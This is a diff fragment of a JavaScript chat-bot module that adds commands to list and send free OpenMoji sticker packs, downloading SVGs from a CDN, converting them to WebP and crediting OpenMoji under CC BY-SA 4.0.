+  def('freepacks', { cat: 'sticker', since: '1.2.0', usage: 'freepacks', desc: 'Browse 12 free OpenMoji sticker packs (no API key needed).' }, async ctx => {
+    const list = Object.entries(OPENMOJI_PACKS).map(([name, codes]) => `• *${name}* (${codes.length})`).join('\n');
+    await ctx.reply(`🎨 Free sticker packs\n${list}\n\nSend *.freepack <name>* to get a pack. Artwork: OpenMoji, CC BY-SA 4.0 (openmoji.org).`, { title: 'Free sticker packs' });
+  });
+
+  def('freepack', { cat: 'sticker', since: '1.2.0', heavy: true, usage: 'freepack <name> [count]', desc: 'Send a free OpenMoji sticker pack; no API key or Telegram token required.' }, async ctx => {
+    const [name, rawCount] = ctx.argv;
+    const codes = OPENMOJI_PACKS[String(name || '').toLowerCase()];
+    if (!codes) throw new UserError('Choose a pack with *.freepacks*, then send *.freepack <name> [count]*.');
+    const count = rawCount ? Number(rawCount) : codes.length;
+    if (!Number.isInteger(count) || count < 1 || count > codes.length) throw new UserError(`Choose a count from 1 to ${codes.length}.`);
+    const pack = `OpenMoji: ${String(name).toLowerCase()}`;
+    const packId = crypto.createHash('sha256').update(`openmoji:${String(name).toLowerCase()}`).digest('hex').slice(0, 32);
+    const urls = codes.slice(0, count);
+    await ctx.reply(`📦 Sending ${count} *${name}* stickers. Artwork by OpenMoji, licensed CC BY-SA 4.0 (openmoji.org).`, { title: 'Free sticker pack' });
+    let sent = 0, failed = 0;
+    for (let i = 0; i < urls.length; i += 4) {
+      const batch = await Promise.allSettled(urls.slice(i, i + 4).map(async code => {
+        const svg = await U.http(OPENMOJI_URL(code), { timeout: 12000, maxBytes: 500000, retries: 1 });
+        const webp = await U.imageToWebp(svg);
+        return U.withExif(webp, pack, OPENMOJI_AUTHOR, packId);
+      }));
+      for (const item of batch) {
+        if (item.status === 'rejected') { failed++; continue; }
+        await ctx.sticker(item.value);
+        sent++;
+        await U.sleep(350);
+      }
+    }
+    if (!sent) throw new UserError('Could not download any stickers. Check that the bot PC can reach cdn.jsdelivr.net, then try again.');
+    if (failed) await ctx.reply(`Sent ${sent} stickers; ${failed} could not be downloaded. Try the pack again for the missing ones.`);
+  });
+};
+
+module.exports.__test = { OPENMOJI_PACKS, OPENMOJI_AUTHOR, OPENMOJI_URL };
